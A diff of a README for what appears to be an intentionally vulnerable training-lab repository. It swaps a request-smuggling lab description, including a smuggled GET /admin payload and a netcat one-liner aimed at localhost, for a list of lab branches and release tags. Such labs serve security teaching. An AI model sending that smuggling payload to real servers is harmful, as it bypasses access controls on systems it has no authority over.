@@ -15,48 +15,47 @@ Participants must exploit this parsing mismatch to smuggle a hidden request and 
 
 allowing attackers to craft a single request that is interpreted as **two separate requests** by different servers.
 
-This lab simulates that behavior in a single backend server to make the vulnerability easy to study and exploit.
+## 📁 Project Structure
+
+Each lab exists in a separate branch:
+
+- 🔐 **JWT Auth Bypass (OAuth)**  
+  Branch: `jwt-oauth`  
+  https://github.com/Zwique/Z_Vuln_Lab/tree/jwt-oauth
+
+- 🧗 **Privilege Escalation**  
+  Branch: `privesc-v3`  
+  https://github.com/Zwique/Z_Vuln_Lab/tree/privesc-v3
+
+- 🧱 **Middleware Vulnerabilities**  
+  Branch: `middleware-v2`  
+  https://github.com/Zwique/Z_Vuln_Lab/tree/middleware-v2
+
+- 🧬 **Server-Side Template Injection (SSTI)**  
+  Branch: `ssti-v1`  
+  https://github.com/Zwique/Z_Vuln_Lab/tree/ssti-v1
 
 ---
 
-## 🎯 Objective
+## 🏷️ Tags & Releases
 
-Gain access to the protected endpoint:
+- 🔐 **v4.0-jwt-oauth**  
+  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v4.0-jwt-oauth
 
-GET /admin
+- 🧗 **v3.0-privesc**  
+  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v3.0-privesc
 
-by smuggling it through a seemingly harmless request to:
+- 🧱 **v2.0-middleware**  
+  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v2.0-middleware
 
-POST /submit
+- 🧬 **v1.0-ssti**  
+  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v1.0-ssti
 
-### The backend:
+---
 
-1. Accepts **both** `Content-Length` and `Transfer-Encoding` headers.
-2. Prioritizes **Transfer-Encoding: chunked**.
-3. **Fails to discard leftover bytes** after chunked decoding.
-4. Treats leftover bytes as a **new HTTP request**.
+## 🚀 How to Use
 
-This allows attackers to smuggle a second request inside the body of the first.
-
-## 🧪 Vulnerable Request Example
-
-```http
-POST /submit HTTP/1.1
-Host: test
-Content-Length: 13
-Transfer-Encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-Host: test
-X-Admin: true
-
-```
-# 💥 Exploitation
-```
-printf 'POST /submit HTTP/1.1\r\nHost: test\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: test\r\nX-Admin: true\r\n\r\n' | nc 127.0.0.1 8000
-```
-```
-python3 exp.py
-```
+```bash
+git clone https://github.com/Zwique/Z_Vuln_Lab.git
+cd Z_Vuln_Lab
+git checkout jwt-oauth
